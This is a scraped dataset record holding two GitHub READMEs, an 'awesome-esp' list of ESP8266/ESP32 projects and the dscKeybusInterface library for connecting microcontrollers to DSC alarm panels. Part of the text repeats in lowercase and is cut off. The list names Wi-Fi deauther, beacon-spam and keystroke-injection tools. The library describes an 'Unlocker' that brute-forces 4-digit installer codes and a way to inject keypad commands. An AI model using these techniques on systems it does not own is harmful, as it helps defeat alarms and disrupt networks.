ESP32.\nTinyUPnP - A lightweight UPnP IGD library for automatic port forwarding on the 8266 and 32.\nEsp32SSHClient - A library that implements a SSH client in the ESP32.\npainlessMesh - A library that takes care of the particulars of creating a simple mesh network using ESP8266 and ESP32 hardware.\nWifiEspNow - Arduino library for ESP-NOW, a connectionless WiFi communication protocol defined by Espressif.\ngo-mcu - Golang package for interacting with NodeMCU-based boards.\nCanAirIO SensorLib - ESP32/8266 library with auto-configuration of multiple PM2.5, CO2 and environment sensors.\nDhyara - A C/C++ library for making a Mobile Ad hoc Network (MANET) using ESP Now.", "link": "https://github.com/agucova/awesome-esp", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome esp\na curated list of awesome esp8266/32 projects and code.\nboth the esp8266 and the esp32 are low-cost wi-fi microchips with full tcp/ip stack and microcontroller capabilities produced by the shanghai-based manufacturer espressif systems.\nsee contributing for information on how to contribute to this list.\ncontents\nfirmware\ntools\nprojects\nsmart home and iot\ninfosec\nbiomedical\nothers\nlibraries\nfirmware\nespressif at - the default vanilla firmware for the esp8266.\nnodemcu - an elua-based firmware for the esp8266.\nespbasic - a basic firmware for easy and wireless programming, ready for the 8266.\nmicropython - an implemention of python3 for the esp8266 and 32.\nesp32 - an experimental firmware for 3d printers, both the esp32 and 8266.\nfrankenstein - a quick and dirty firmware with cool features for the esp8266.\nmongooseos - an iot specific firmware, with both c and js. available for the esp32/8266.\ndevicehive - a firmware made as a client for devicehive's iot data platform, only for the 8266.\nrt-thread - chinese open source firmware available for the esp32.\nsming framework - superb c/c++ iot framework with support for esp8266 and esp32.\ntools\nesp flash -----> tool !!!  - the vanilla firmware flasher for both esp's.\narduino core/8266 - the arduino core for the esp8266.\narduino core/32 - the other arduino core for the esp32.\nesptool - espressif's command line tool for bootloader comms in both esp's.\nesp-open-sdk - an open sdk for the esp8266.\nesptool-ck - a cli tool for flashing in the esp8266.\nesptool-gui - a flashing gui tool based on esptool-ck.\nnodemcu flasher - nodemcu's official flashing tool for its os.\nluanode - a lua-only sdk for 32/8266.\ntuya-convert - a wi-fi firmware flasher esp8266 that has been pre-loaded with tuya firmware.\ntasmotizer - a graphical flashing tool for tasmota firmware. can manage wi-fi & mqtt settings, modules & templates.\narduino fs plugin - an arduino plugin for filesystem uploads in the 8266.\nplatformio - cross platform ide and debugger that supports both the esp32 and esp8266.\nprojects\nsmart home and iot\nopenmqttgateway - an implementation of a multiprotocol mqtt gateway for both esp's among other devices.\nesphome - a full-featured system for controlling esp's through simple yet powerful configuration files and home automation systems.\ntasmota - an alternative firmware for sonoff & other esp8266/esp32 devices. includes a large collection of sensor drivers & integrates with home assistant natively or via mqtt.\nsonoff-homekit - an alternative firmware for sonoff devices (and other 8266 devices) which allows control through apple's homekit.\ndoorsignepd - a smart... doorsign with an e-paper display using the esp32.\nepaperweatherdisplay - a very cute e-ink weather display using the esp32.\nsupergreenos - a full-featured home farming automation software for the esp32.\ncanairio - citizen science project that uses mobile and fixed stations to measure air quality with esp32 and smartphones.\ninfosec\nesp32-blecollector - a wardriving device which displays ble devices and collects data from them, all in a nice screen interface.\nesp32marauder - an integrated suite of offensive and defensive tools for wifi and bluetooth.\narduinopcap - a library which allows generation of .pcap files with network traffic, for both esp's.\nwifi satellite - a giant wifi \"satellite\" that can monitor all 14 2.4ghz channels using, well, 14 esp32s.\nesp8266 deauther - a very cool pseudojammer (deauther) of wifi networks that uses the esp8266.\npacketmonitor - a beautiful oled monitor for packet activity in a wifi channel. two versions for each esp.\nwifiduck - a wireless-enabled keystroke injector, analogous, but even more awesome than the rubber ducky.\nesp8266 beacon spam - want to confuse people? this device creates hundreds of fake wifi networks.\ndeauthdetector - a small device that shines a light if it detects a wifi deauth attack. made by the same guy as the last six projects.\nbiomedical\nheartypatch - a wearable ble and wifi connected ecg-hr patch which uses the esp32.\nhealthypi v4 - an amazing open source vital signs monitor that can monitor ecg, respiration, pulse oximetry and body temperature, all run by an esp32.\nlora\nmeshtastic - esp32 lora boards as secure, long battery life, mesh gps communicators.\nesp32-paxcounter wifi & bluetooth driven, lorawan enabled, battery powered mini paxcounter built on cheap esp32 lora iot boards\ndisaster radio - a disaster-resilient communications network powered by the sun\nothers\nopen smartwatch - a foss smartwatch with gps, an inertial unit and an extremely cool 3d-printed case.\nsoftrf - a diy aviation proximity awareness system that can be used in uav projects.\nretro esp32 - an extremely cool launcher for the odroid go (with the esp32), which allows emulating several retro consoles.\npedalinomini - a wireless midi pedal controller for guitarists, built with the esp32.\nstickwatch - a smartwatch module based on the m5stick, using the esp32.\ndronebridge - an implementation of dronebridge, a signal link for drones and uav's on the esp32.\nlibraries\nwasm3 - a lightning fast webassembly interpreter designed for embedded devices, compatible with both esp's.\nhomie8266 - framework implementation of the homie protocol for the 8266.\nesp-dash - beautiful and fast framework for creating remote dashboards in the 8266/32. no internet required.\nesp_mqtt - mqtt helper library for the esp8266.\nguislice - a drag and drop gui framework for several devices and screen controllers. compatible with 8266 and 32.\nmicrowebsrv2 - a very powerful micropython web server which can be used in the esp32.\nirremoteesp8266 - emit and receive ir signals in the esp8266.\nesphomelib - framework to integrate with homeassistant in the 8266.\ntts - a somehow good text to speech library for several arduino devices, both esp's included.\nfree802.11 - library to emit arbitrary 802.11 signals with the esp32.\nkoyn - a decentralized bitcoin library for the esp32 and the esp8266.\ntftlibrary - tft compatibility for the esp32.\nutft-esp - utft support for the esp32/8266.\nespaudio - library for playing a diverse range of audio formats in the esp8266/esp32.\nasynctcp - asynchronous tcp library for both the 8266 and the 32.\nesp-homekit - homekit implementation for 8266 on rtos.\nesphelper - mqtt and wi-fi automation-oriented library for the 8266.\nesphelper/32 - port of the esphelper library for the 32.\nesp8266wifi - simple arduino wifi library for the 8266.\nwifiesp - arduino library for wifi management, client/server for 8266 board.\ntinygsm - a quick and simple arduino library for interaction with gsm modules which can also control the 8266 through at commands.\nmjs - a lightweight and restricted js engine that is used by mongooseos, compatible on the 32 and 8266.\nespui - a simply library for making interactive web interfaces for both esp's.\nesp32 epaper - a full-featured library for using epaper modules with the esp32.\ntinyupnp - a lightweight upnp igd library for automatic port forwarding on the 8266 and 32.\nesp32sshclient - a library that implements a ssh client in the esp32.\npainlessmesh - a library that takes care of the particulars of creating a simple mesh network using esp8266 and esp32 hardware.\nwifiespnow - arduino library for esp-now, a connectionless wifi communication protocol defined by espressif.\ngo-mcu - golang package for interacting with nodemcu-based boards.\ncanairio sensorlib - esp32/8266 library with auto-configuration of multiple pm2.5, co2 and environment sensors.\ndhyara - a c/c++ library for making a mobile ad hoc network (manet) using esp now.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000266, "year": null}, {"Unnamed: 0": 272, "autor": 272, "date": null, "content": "DSC Keybus Interface\nThis library directly interfaces Arduino, esp8266, and esp32 microcontrollers to DSC PowerSeries security systems for integration with home automation, notifications on alarm events, and direct control as a virtual keypad. This enables existing DSC security system installations to retain the features and reliability of a hardwired system while integrating with modern devices and software for under $5USD in components.\nThe built-in examples can be used as-is or as a base to adapt to other uses:\nHome automation integration: Home Assistant, Apple HomeKit & Siri, Google Home, OpenHAB, Athom Homey\nNotifications: Telegram bot, PushBullet, Twilio SMS, E-mail\nVirtual keypad: Web interface, Blynk mobile app\nInstaller code unlocking: automatic code search to unlock panels with unknown installer codes\nSee the dscKeybusInterface-RTOS repository for a port of this library to esp-open-rtos - this enables a standalone esp8266 HomeKit accessory using esp-homekit.\nExample integrations:\nApple Home & Siri:\nHome Assistant:\nOpenHAB MQTT:\nBlynk app virtual keypad:\nWeb virtual keypad:\nTelegram bot:\nQuick start\nInstall the DSC Keybus Interface library:\nArduino IDE: Search for DSC in the Library Manager - Sketch > Include Library > Manage Libraries\nPlatformIO IDE: Search for DSC in the PlatformIO Library Registry\nPlatformIO CLI: platformio lib install \"dscKeybusInterface\"\nAlternatively, git clone or download the repo .zip to the Arduino/PlatformIO library directory to keep track of the latest changes.\nSelect, configure, and upload one of the example sketches to the microcontroller:\nConnect the microcontroller to the DSC Keybus per the wiring diagram with the appropriate resistors (and a transistor if you'd like to control the system).\nWhy?\nI Had: A DSC security system not being monitored by a third-party service.\nI Wanted: Notification if the alarm triggered.\nI was interested in finding a solution that directly accessed the pair of data lines that DSC uses for their proprietary Keybus protocol to send data between the panel, keypads, and other modules. Tapping into the data lines is an ideal task for a microcontroller and also presented an opportunity to work with the Arduino and FreeRTOS (via esp-open-rtos) platforms.\nWhile there has been excellent discussion about the DSC Keybus protocol and a several existing projects, there were a few issues that remained unsolved:\nError-prone Keybus data capture.\nLimited data decoding - there was good progress for armed/disarmed states and partial zone status for a single partition, but otherwise most of the data was undecoded (notably missing the alarm triggered state).\nRead-only - unable to control the Keybus to act as a virtual keypad.\nNo implementations to do useful work with the data.\nPoking around with a logic analyzer and oscilloscope revealed that the errors capturing the Keybus data were timing issues - after resolving the data errors, it was possible to reverse engineer the protocol by capturing the Keybus binary data as the security system handled various events.\nFeatures\nMonitor the status of all partitions:\nAlarm triggered, armed/disarmed, entry/exit delay, fire triggered, keypad panic keys\nMonitor zones status:\nZones open/closed, zones in alarm\nMonitor system status:\nReady, trouble, AC power, battery\nMonitor PGM outputs 1-14 status\nVirtual keypad:\nWrite keys to the panel for all partitions\nPanel time - retrieve current panel date/time and set a new date/time\nPanel installer code unlocking - determine the 4-digit panel installer code\nDirect Keybus interface:\nDoes not require the DSC IT-100 serial interface.\nDesigned for reliable data decoding and performance:\nPin change and timer interrupts for accurate data capture timing\nData buffering: helps prevent lost Keybus data if the sketch is busy\nExtensive data decoding: the majority of Keybus data as seen in the DSC IT-100 Data Interface developer's guide has been reverse engineered and documented in src/dscKeybusPrintData.cpp.\nNon-blocking code: Allows sketches to run as quickly as possible without using delay or delayMicroseconds\nSupported security systems:\nDSC PowerSeries\nVerified panels: PC585, PC1555MX, PC1565, PC5005, PC5010, PC5015, PC5020, PC1616, PC1808, PC1832, PC1864.\nAll PowerSeries series are supported, please post an issue if you have a different panel and have tested the interface to update this list.\nRebranded DSC PowerSeries (such as some ADT systems) should also work with this interface.\nUnsupported security systems:\nDSC Classic series (PC1500, PC1550, etc) use a different data protocol, though support is possible.\nDSC Alexor (PC9155) is all wireless and does not have an accessible Keybus interface.\nDSC Neo series use a higher speed encrypted data protocol (Corbus) that is not currently possible to support.\nOther brands (that are not rebranded DSC systems) use different protocols and are not supported.\nFor Honeywell Ademco Vista 15P/20P, see Dilbert66's esphome-vistaECP project\nFor Paradox systems, see liaan's paradox-esp8266 project\nSupported microcontrollers:\nArduino:\nBoards: Uno, Mega, Leonardo, Mini, Micro, Nano, Pro, Pro Mini\nATmega328P, ATmega2560, and ATmega32U4-based boards at 16Mhz\nesp8266:\nDevelopment boards: NodeMCU v2 or v3, Wemos D1 Mini, etc.\nIncludes Arduino framework support and WiFi for ~$3USD shipped.\nesp32:\nDevelopment boards: NodeMCU ESP-32S, Doit ESP32 Devkit v1, Wemos Lolin D32, etc.\nIncludes Arduino framework support (v1.0.5-rc6 or newer required), dual cores, WiFi, and Bluetooth for ~$5USD shipped.\nPossible features (PRs welcome!):\nDSC IT-100 emulation\nUnlock 6-digit installer codes\nDSC Classic series support: This protocol is already decoded, use with this library would require major changes.\nRelease notes\n2.0\nNew: Telegram bot example sketch\nNew: OpenHAB integration example sketch using MQTT\nNew: Unlocker example sketch - determines the panel installer code\nNew: TimeSyncNTP example sketch - uses NTP to automatically set the panel time\nNew: ESPHome integration example (located in the extras directory) - thanks to Dilbert66 for this contribution!\nNew: TinyGMS-SMS example sketch - sends status via SMS with a GSM modem - thanks to jvitkauskas for this contribution!\nNew: KeybusReaderIP example sketch enables Keybus data access over IP, thanks to aboulfad for this contribution!\nNew: esp32 microcontroller support - requires Arduino-esp32 v1.0.5-rc6 or newer\nNew: Features for sketches:\nready and disabled track partition status\nsetTime() sets the panel date and time\npgmOutputs[] tracks the status of PGM outputs 1-14\ntimestampChanged tracks when the panel sends a timestamp\naccessCode tracks the access code used to arm/disarm\nresetStatus() triggers a full status update of all partitions and zones - for example, after initialization or a lost network connection.\npauseStatus pauses status updates if set to true - for example, holding status changes during a lost network connection\nstop() disables the interface - for example, prior to starting OTA updates\nappendPartition() in example sketches simplifies adding partition numbers to messages\npanelVersion tracks the panel version number\nNew: Handle *1 bypass/re-activate used to change stay/away mode while armed\nUpdated: VirtualKeypad-Blynk and VirtualKeypad-Web display alarm memory, programming zone lights, and event buffer\nUpdated: HomeAssistant-MQTT, Homebridge-MQTT, OpenHAB-MQTT include PGM outputs 1-14 status\nUpdated: Virtual keypad writes\nwrite() for multiple keys can now be set to block until the write is complete with an optional parameter if the char array is ephemeral\nChecking writeReady is typically no longer needed in the sketch, the library will block if a previous write is in progress - this can be checked if the sketch needs to wait until the library can perform a nonblocking write\nUpdated: HomeAssistant-MQTT sketch now includes night arm and for esp8266/esp32 includes a sensor with partition status messages\nUpdated: Expanded partition state processing to improve panel state detection at startup\nDeprecated: handlePanel() is now loop()\nBugfix: Resolved keypad aux/panic key, AC power, and battery status on PC585/PC1555MX\nBugfix: Resolved Homebridge-MQTT sketch not handling HomeKit target states\nBugfix: Resolved timing issues when consecutively calling write\n1.2\nNew: Virtual keypad web interface example, thanks to Elektrik1 for this contribution!\nAs of esp8266 Arduino Core 2.5.1, you may need to manually update the esp8266FS plugin for SPIFFS upload.\nNew: Support esp8266 CPU running at 160MHz - this helps sketches using TLS through BearSSL\nUpdated: HomeAssistant-MQTT example includes availability status, thanks to bjrolfe for this contribution!\nUpdated: List of tested DSC panels: PC585, PC1565, PC5005, PC1808\nUpdated: esp8266 power wiring diagrams\nUpdated: esp8266 module list\n1.1\nNew: Zones 33-64 tamper and fault decoding\nNew: Push notification example using Twilio, thanks to ColingNG for this contribution!\nBugfix: Zones 17-32 status incorrectly stored\n1.0\nNew: Blynk virtual keypad example sketch and app layout examples\nNew: Virtual keypad support for PGM terminals 1-4 command output\nNew: Status keybusConnected to check if data is being received from the DSC panel\nNew: Auxiliary input alarm decoding\n0.4\nNew: Virtual keypad support for partitions 3-8, thanks to jvitkauskas for contributing the necessary logs\nNew: Support ATmega32U4-based Arduino boards (switched to AVR Timer1)\nChanged: Simplified example names, configurations, added version numbers\nBugfix: Virtual keypad writes with partitions 5-8 enabled\nBugfix: F/A/P alarm key writes with processModuleData disabled\nBugfix: HomeAssistant example configuration.yaml error for alarm_control_panel\n0.3\nNew: Status for partitions 2-8, zones 33-64\nNew: Virtual keypad support for partition 2\nNew: Athom Homey integration example sketch, thanks to MagnusPer for this contribution!\nNew: PCB layouts, contributed by sjlouw\nNew: Configurable number of partitions and zones to customize memory usage: dscPartitions and dscZones in dscKeybusInterface.h\nNew: KeybusReader decoding of commands 0xE6 and 0xEB\nChanged: Split examples by platform\nChanged: Arduino sketches no longer use pin 4 to avoid a conflict with the SD card on Ethernet shields.\nChanged: MQTT examples updated with username and password fields\nChanged: processRedundantData now true by default to prevent storing repetitive data, reduces memory usage.\nNote: This release changes the library methods to accommodate multiple partitions, existing sketches will need to be updated to match the new example sketches.\n0.2\nNew: Status for zones 9-32\nNew: Home Assistant integration example sketch\nNew: Panel data buffering, adds dscBufferSize to dscKeybusInterface.h to allow configuration of how many panel commands are buffered to customize memory usage (uses 18 bytes of memory per command buffered).\n0.1 - Initial release\nExamples\nThe included examples demonstrate how to use the library and can be used as-is or adapted to integrate with other software. Post an issue/pull request if you've developed (and would like to share) a sketch/integration that others can use.\nStatus: Processes and prints the security system status to a serial interface, including reading from serial for the virtual keypad. This demonstrates how to determine if the security system status has changed, what has changed, and how to take action based on those changes. Post an issue/pull request if you have a use for additional system states - for now, only a subset of all decoded commands are being tracked for status to limit memory usage:\nPartitions ready\nPartitions armed away/stay/disarmed\nPartitions in alarm\nPartitions exit delay in progress\nPartitions entry delay in progress\nPartitions fire alarm\nZones open/closed\nZones in alarm\nPGM outputs 1-14\nKeypad fire/auxiliary/panic alarm\nGet/set panel date and time\nUser access code number (1-40)\nPanel AC power\nPanel battery\nPanel trouble\nKeybus connected\nHomebridge-MQTT: Interfaces with Homebridge via MQTT to integrate with Apple HomeKit (including the iOS Home app and Siri) and Google Home. Demonstrates arming/disarming partitions and for HomeKit, viewing the status of zones, PGM outputs, and fire alarms.\nThe dscKeybusInterface-RTOS library includes a native HomeKit implementation that runs directly on esp8266, without requiring a separate device running MQTT or Homebridge.\nHomeAssistant-MQTT: Interfaces with Home Assistant via MQTT. Demonstrates arming/disarming partitions and viewing the status of zones, PGM outputs, fire alarms, and trouble. For esp8266/esp32, the partition status is available as a text message for display.\nOpenHAB-MQTT: Interfaces with OpenHAB via MQTT. Demonstrates using the panel and partitions states as OpenHAB switches and zone states as OpenHAB contacts. For esp8266/esp32, a panel status message is also sent as a string to OpenHAB. See https://github.com/jimtng/dscalarm-mqtt for an integration using the Homie convention for OpenHAB's Homie MQTT component.\nESPHome (esp8266): Integrates with ESPHome as a custom component - note that this example is located in the extras directory. Thanks to Dilbert66 for this contribution!\nHomey: Integrates with Athom Homey and the Homeyduino library, including armed, alarm, and fire states (currently limited to one partition), and zone states. Thanks to MagnusPer for contributing this example!\nTelegram (esp8266/esp32): Demonstrates sending status updates and arming/disarming the security system via a Telegram bot.\nPushbullet (esp8266/esp32): Demonstrates sending status updates as a push notification via Pushbullet.\nTwilio-SMS (esp8266/esp32): Demonstrates sending status updates as an SMS text message via Twilio - thanks to ColingNG for contributing this example!\nEmail (esp8266/esp32): Demonstrates sending status updates as an email. Email is sent using SMTPS (port 465) with SSL for encryption - this is necessary on the esp8266/esp32 until STARTTLS can be supported. For example, this will work with Gmail after changing the account settings to allow less secure apps.\nThis can be used to send SMS text messages if the number's service provider has an email to SMS gateway - examples for the US:\nT-mobile: 5558675309@tmomail.net\nVerizon: 5558675309@vtext.com\nSprint: 5558675309@messaging.sprintpcs.com\nAT&T: 5558675309@txt.att.net\nVirtualKeypad-Blynk (esp8266/esp32): Provides a virtual keypad interface for the free Blynk app on iOS and Android, including viewing alarm memory, programming zone lights, and the event buffer. Scan one of the following QR codes from within the Blynk app for an example keypad layout:\nVirtual keypad with 16 zones\nVirtual keypad with 32 zones\nVirtual keypad with 8 zones and event log\nNote: Installing Blynk as a local server is recommended to keep control of the security system internal to your network. This also lets you use as many widgets as needed for free - local servers can setup users with any amount of Blynk Energy. Using the default Blynk cloud service with the above example layouts requires more of Blynk's Energy units than available on the free usage tier.\nVirtualKeypad-Web (esp8266/esp32): Provides a virtual keypad web interface, using the esp8266/esp32 itself as a standalone web server, including viewing alarm memory, programming zone lights, and the event buffer. Thanks to Elektrik1 for contributing this example!\nTimeSyncNTP: Synchronizes and maintains the panel time via an NTP server, including DST adjustments.\nUnlocker: Checks all possible 4-digit installer codes until a valid code is found, including handling keypad lockout if enabled. The valid code is output to serial as well as repeatedly flashed with the built-in LED.\nKeybusReader: Decodes and prints data from the Keybus to a serial interface, including reading from serial for the virtual keypad. This can be used to help decode the Keybus protocol and is also handy as a troubleshooting tool to verify that data is displayed without errors. For esp8266/esp32, KeybusReaderIP enables connectivity over WiFi.\nSee src/dscKeybusPrintData.cpp for all currently known Keybus protocol commands and messages. Issues and pull requests with additions/corrections are welcome!\nMore DSC projects\ndscalarm-mqtt: implementation of the Homie MQTT convention\nesphome-dsckeybus: implementation of this library as an ESPHome custom component\nPC1500KeybusReader: MQTT HomeKit example for the PC1500 and ESP32 using dougkpowers/pc1550-interface\nWiring\nDSC Aux(+) ---+--- Arduino Vin pin\n|\n+--- 5v voltage regulator --- esp8266 NodeMCU / Wemos D1 Mini 5v pin\nesp32 development board 5v pin\nDSC Aux(-) --- Arduino/esp8266/esp32 Ground\nArduino +--- dscClockPin (Arduino Uno: 2,3)\nDSC Yellow ---+--- 15k ohm resistor ---|\n| +--- 10k ohm resistor --- Ground\n|\n| esp8266/esp32 +--- dscClockPin (esp8266: D1,D2,D8 / esp32: 4,13,16-39)\n+--- 33k ohm resistor ---|\n+--- 10k ohm resistor --- Ground\nArduino +--- dscReadPin (Arduino Uno: 2-12)\nDSC Green ----+--- 15k ohm resistor ---|\n| +--- 10k ohm resistor --- Ground\n|\n| esp8266/esp32 +--- dscReadPin (esp8266: D1,D2,D8 / esp32: 4,13,16-39)\n+--- 33k ohm resistor ---|\n+--- 10k ohm resistor --- Ground\nVirtual keypad (optional):\nDSC Green ---- NPN collector --\\\n|-- NPN base --- 1k ohm resistor --- dscWritePin (Arduino Uno: 2-12 / esp8266: D1,D2,D8 / esp32: 4,13,16-33)\nGround --- NPN emitter --/\nThe DSC Keybus operates at ~12.6v, a pair of resistors per data line will bring this down to an appropriate voltage for each microcontroller.\nArduino:\nThe DSC yellow (clock) line connects to a hardware interrupt pin - for the Uno, these are pins 2 or 3. The example sketches use dscClockPin: 3.\nThe DSC green (data) line can be connected to any of the remaining digital pins 2-12. The examples sketches use dscReadPin: 5 and dscWritePin: 6.\nesp8266: connect the DSC lines to GPIO pins that are normally low to avoid putting spurious data on the Keybus: D1 (GPIO5), D2 (GPIO4) and D8 (GPIO15). The example sketches use dscClockPin: D1, dscReadPin: D2, dscWritePin: D8.\nesp32: connect the DSC lines to GPIO pins that do not send signals at boot: 4, 13, 16-39. For virtual keypad, use pins 4, 13, 16-33 - pins 34-39 are input only and cannot be used. The example sketches use dscClockPin: 18, dscReadPin: 19, dscWritePin: 21.\nVirtual keypad uses an NPN transistor and a resistor to write to the Keybus. Most small signal NPN transistors should be suitable, for example:\n2N3904\nBC547, BC548, BC549\nThat random NPN at the bottom of your parts bin (my choice)\nPower:\nArduino boards can be powered directly from the DSC panel\nesp8266/esp32 development boards should use an external voltage regulator set to 5v to the 5v pin:\nLM2596-based step-down buck converter modules are reasonably efficient and commonly available for under $1USD shipped (eBay, Aliexpress, etc) - these are the modules I use.\nMP2307-based step-down buck converter modules (aka Mini360) are also available but some versions run hot with an efficiency nearly as poor as linear regulators.\nLinear voltage regulators (LM7805, etc) will work but are inefficient and run hot - these may need a heatsink.\nesp8266/esp32 boards can also use an external voltage regulator set to 3.3v to the 3.3v pin - this bypasses the module's onboard voltage regulator. For example, some Wemos D1 mini clones use low current voltage regulators that can cause stability issues. NodeMCU boards are not affected as they use the more powerful AMS1117 regulator.\nConnections should be soldered, breadboards can cause issues.\nVirtual keypad\nThis allows a sketch to send keys to the DSC panel to emulate the physical DSC keypads and enables full control of the panel from the sketch or other software.\nKeys are sent to partition 1 by default and can be changed to a different partition. The following keys can be sent to the panel - see the examples for usage:\nKeypad: 0-9 * #\nArm stay (requires access code if quick arm is disabled): s\nArm away (requires access code if quick arm is disabled): w\nArm with no entry delay (requires access code): n\nFire alarm: f\nAuxiliary alarm: a\nPanic alarm: p\nDoor chime enable/disable: c\nFire reset: r\nQuick exit: x\nChange partition: / + partition number or set writePartition to the partition number. Examples:\nSwitch to partition 2 and send keys: /2 + 1234\nSwitch back to partition 1: /1\nSet directly in sketch: dsc.writePartition = 8;\nCommand output 1: [\nCommand output 2: ]\nCommand output 3: {\nCommand output 4: }\nDSC Configuration\nPanel options affecting this interface, configured by *8 + installer code - see the Unlocker sketch if your panel's installer code is unknown. Refer to the DSC installation manual for your panel to configure these options:\nPC1555MX/5015 section 370, PC1616/PC1832/PC1864 section 377:\nSwinger shutdown: By default, the panel will limit the number of alarm commands sent in a single armed cycle to 3 - for example, a zone alarm being triggered multiple times will stop reporting after 3 alerts. This is to avoid sending alerts repeatedly to a third-party monitoring service, and also affects this interface. As I do not use a monitoring service, I disable swinger shutdown by setting this to 000.\nAC power failure reporting delay: The default delay is 30 minutes and can be set to 000 to immediately report a power failure.\nNotes\nFor OTA updates on esp8266 and esp32, you may need to stop the interface using dsc.stop();:\nvoid setup() {\n...\nArduinoOTA.onStart([]() {\ndsc.stop();\n...\nMemory usage can be adjusted based on the number of partitions, zones, and data buffer size specified in src/dscKeybusInterface.h. Default settings:\nArduino: up to 4 partitions, 32 zones, 10 buffered commands\nesp8266/esp32: up to 8 partitions, 64 zones, 50 buffered commands\nPCB layouts are available in extras/PCB Layouts - thanks to sjlouw for contributing these designs!\nSupport for other platforms depends on adjusting the code to use their platform-specific timers. In addition to hardware interrupts to capture the DSC clock, this library uses platform-specific timer interrupts to capture the DSC data line in a non-blocking way 250\u03bcs after the clock changes (without using delayMicroseconds()). This is necessary because the clock and data are asynchronous - I've observed keypad data delayed up to 160\u03bcs after the clock falls.\nTroubleshooting\nIf you are running into issues:\nRun the KeybusReader example sketch and view the serial output to verify that the interface is capturing data successfully without reporting CRC errors.\nIf data is not showing up or has errors, check the clock and data line wiring, resistors, and all connections. Breadboards can cause issues, connections should be soldered instead.\nFor virtual keypad, run the KeybusReader example sketch and enter keys through serial and verify that the keys appear in the output and that the panel responds.\nIf keys are not displayed in the output, verify the transistor pinout, base resistor, and wiring connections.\nRun the Status example sketch and view the serial output to verify that the interface displays events from the security system correctly as partitions are armed, zones opened, etc.\nReferences\nAVR Freaks - DSC Keybus Protocol: An excellent discussion on how data is sent on the Keybus.\nstagf15/DSC_Panel: A library that nearly works for the PC1555MX but had timing and data errors. Writing this library from scratch was primarily a programming exercise, otherwise it should be possible to patch the DSC_Panel library.\ndougkpowers/pc1550-interface: An interface for the DSC Classic series.", "link": "https://github.com/taligentx/dscKeybusInterface", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "dsc keybus interface\nthis library directly interfaces arduino, esp8266, and esp32 microcontrollers to dsc powerseries security systems for integration with home automation, notifications on alarm events, and direct control as a virtual keypad. this enables existing dsc security system installations to retain the features and reliability of a hardwired system while integrating with modern devices and software for under $5usd in components.\nthe built-in examples can be used as-is or as a base to adapt to other uses:\nhome automation integration: home assistant, apple homekit & siri, google home, openhab, athom homey\nnotifications: telegram bot, pushbullet, twilio sms, e-mail\nvirtual keypad: web interface, blynk mobile app\ninstaller code unlocking: automatic code search to unlock panels with unknown installer codes\nsee the dsckeybusinterface-rtos repository for a port of this library to esp-open-rtos - this enables a standalone esp8266 homekit accessory using esp-homekit.\nexample integrations:\napple home & siri:\nhome assistant:\nopenhab mqtt:\nblynk app virtual keypad:\nweb virtual keypad:\ntelegram bot:\nquick start\ninstall the dsc keybus interface library:\narduino ide: search for dsc in the library manager - sketch > include library > manage libraries\nplatformio ide: search for dsc in the platformio library registry\nplatformio cli: platformio lib install \"dsckeybusinterface\"\nalternatively, git clone or download the repo .zip to the arduino/platformio library directory to keep track of the latest changes.\nselect, configure, and upload one of the example sketches to the microcontroller:\nconnect the microcontroller to the dsc keybus per the wiring diagram with the appropriate resistors (and a transistor if you'd like to control the system).\nwhy?\ni had: a dsc security system not being monitored by a third-party service.\ni wanted: notification if the alarm triggered.\ni was interested in finding a solution that directly accessed the pair of data lines that dsc uses for their proprietary keybus protocol to send data between the panel, keypads, and other modules. tapping into the data lines is an ideal task for a microcontroller and also presented an opportunity to work with the arduino and freertos (via esp-open-rtos) platforms.\nwhile there has been excellent discussion about the dsc keybus protocol and a several existing projects, there were a few issues that remained unsolved:\nerror-prone keybus data capture.\nlimited data decoding - there was good progress for armed/disarmed states and partial zone status for a single partition, but otherwise most of the data was undecoded (notably missing the alarm triggered state).\nread-only - unable to control the keybus to act as a virtual keypad.\nno implementations to do useful work with the data.\npoking around with a logic analyzer and oscilloscope revealed that the errors capturing the keybus data were timing issues - after resolving the data errors, it was possible to reverse engineer the protocol by capturing the keybus binary data as the security system handled various events.\nfeatures\nmonitor the status of all partitions:\nalarm triggered, armed/disarmed, entry/exit delay, fire triggered, keypad panic keys\nmonitor zones status:\nzones open/closed, zones in alarm\nmonitor system status:\nready, trouble, ac power, battery\nmonitor pgm outputs 1-14 status\nvirtual keypad:\nwrite keys to the panel for all partitions\npanel time - retrieve current panel date/time and set a new date/time\npanel installer code unlocking - determine the 4-digit panel installer code\ndirect keybus interface:\ndoes not require the dsc it-100 serial interface.\ndesigned for reliable data decoding and performance:\npin change and timer interrupts for accurate data capture timing\ndata buffering: helps prevent lost keybus data if the sketch is busy\nextensive data decoding: the majority of keybus data as seen in the dsc it-100 data interface developer's guide has been reverse engineered and documented in src/dsckeybusprintdata.cpp.\nnon-blocking code: allows sketches to run as quickly as possible without using delay or delaymicroseconds\nsupported security systems:\ndsc powerseries\nverified panels: pc585, pc1555mx, pc1565, pc5005, pc5010, pc5015, pc5020, pc1616, pc1808, pc1832, pc1864.\nall powerseries series are supported, please post an issue if you have a different panel and have tested the interface to update this list.\nrebranded dsc powerseries (such as some adt systems) should also work with this interface.\nunsupported security systems:\ndsc classic series (pc1500, pc1550, etc) use a different data protocol, though support is possible.\ndsc alexor (pc9155) is all wireless and does not have an accessible keybus interface.\ndsc neo series use a higher speed encrypted data protocol (corbus) that is not currently possible to support.\nother brands (that are not rebranded dsc systems) use different protocols and are not supported.\nfor honeywell ademco vista 15p/20p, see dilbert66's esphome-vistaecp project\nfor paradox systems, see liaan's paradox-esp8266 project\nsupported microcontrollers:\narduino:\nboards: uno, mega, leonardo, mini, micro, nano, pro, pro mini\natmega328p, atmega2560, and atmega32u4-based boards at 16mhz\nesp8266:\ndevelopment boards: nodemcu v2 or v3, wemos d1 mini, etc.\nincludes arduino framework support and wifi for ~$3usd shipped.\nesp32:\ndevelopment boards: nodemcu esp-32s, doit esp32 devkit v1, wemos lolin d32, etc.\nincludes arduino framework support (v1.0.5-rc6 or newer required), dual cores, wifi, and bluetooth for ~$5usd shipped.\npossible features (prs welcome!):\ndsc it-100 emulation\nunlock 6-digit installer codes\ndsc classic series support: this protocol is already decoded, use with this library would require major changes.\nrelease notes\n2.0\nnew: telegram bot example sketch\nnew: openhab integration example sketch using mqtt\nnew: unlocker example sketch - determines the panel installer code\nnew: timesyncntp example sketch - 